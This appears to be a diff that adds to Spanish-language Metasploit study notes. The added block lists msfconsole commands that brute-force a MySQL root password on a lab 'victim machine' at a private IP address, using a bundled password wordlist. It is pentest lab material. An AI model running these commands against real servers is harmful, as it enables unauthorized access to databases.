@@ -330,3 +330,17 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 	❯ set password ""
 	❯ exploit
 ```
+
+```bash 
+# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/mysql/mysql_login         # Usamos el auxiliar
+	❯ options
+	❯ set username root
+	❯ set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+	❯ set STOP_ON_SUCCESS true
+	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set verbose false
+	❯ run 
+```
